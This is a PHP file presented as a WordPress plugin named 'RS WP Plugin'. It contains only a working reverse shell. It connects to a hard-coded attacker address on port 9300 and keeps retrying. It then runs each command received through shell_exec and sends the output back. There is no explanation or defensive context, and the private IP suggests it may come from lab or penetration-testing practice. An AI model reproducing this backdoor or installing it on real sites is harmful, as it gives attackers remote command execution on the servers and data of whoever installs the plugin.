<?php
/**
 * Plugin Name:       RS WP Plugin
 * Author:            Geomancer
 */

$attacker_ip = "192.168.56.105";
$attacker_port = 9300;

$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

if ($socket === false) {
    fwrite(STDERR, "socket_create failed: " . socket_strerror(socket_last_error()) . "\n");
    exit(1);
}

while((@socket_connect($socket, $attacker_ip, $attacker_port) === false)){
    sleep(5);
}

while(true){
    
    // receive 
    $res = socket_read($socket, 4096, PHP_BINARY_READ);

    if($res == false){
        fwrite(STDERR, "socket_read failed\n");
        break;
    }
    
    $res = rtrim($res, "\r\n");

    // exec
    $output = shell_exec($res);
    if($output !== null){
        $output = "[+] Client says: \n". $output;
    }else{
        $output = "[-] Command failed or no output recieved";
    }
    // send
    $output = $output . "\n";
    $len = strlen($output);
    $sent = 0;

    while($sent < $len){
        $n = socket_write(
            $socket,
            substr($output, $sent),
            $len - $sent
        );

        if($n === false){
            fwrite(
                STDERR,
                "socket_write failed: ",
                socket_strerror(socket_last_error($socket))."\n"
            );
        }
        $sent += $n;
    }

}

?>